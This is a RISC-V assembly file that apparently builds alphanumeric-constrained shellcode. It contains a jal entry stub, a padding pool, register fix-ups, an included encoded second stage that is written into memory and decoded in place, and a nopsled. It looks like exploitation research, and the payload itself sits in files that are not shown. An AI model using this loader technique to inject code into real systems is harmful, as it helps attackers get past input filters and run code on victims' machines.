/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

include(`../scripts/common.m4')#'

#define XP sp
.macro dangerous_nop2
    li     t1,-2
.endm

#ifndef COMPUTE_XP_FIXUP
/*# Defines 'xp_fixup' and 'end_nopsled' */
#include "xp_fixup.S"
#endif

.global _start
_start:
step0:
    .word 0x2330236F /*# This is the minimal 'jal reg, step1' */

payload_pool:
    repeat(5435, {.half 0x4242})

step1: /*# Move 'link' register to XP */
    sra      s4, zero, s3 /*# s4 := 0 */
    sra      XP, t1, s4   /*# XP := t1 */

step3: /*# Fixup XP (Need to have 'XP == step6') */
    #ifndef COMPUTE_XP_FIXUP
    xp_fixup
    #endif

step4: /*# Write stage2 */
.macro next_block
    /*# 'addi XP,XP,16', but gas chooses another non-alnum encoding */
    .short 0x6141
.endm
#include "stage2_encoded.S"

step5: /*# Nopsled to make up for loose ends. */
/*# TODO: could be removed */
    #ifndef COMPUTE_XP_FIXUP
    end_nopsled
    #endif

step6: /*# Stage 2 will be decoded here */
    csrc  mip,sp
.global end
end:
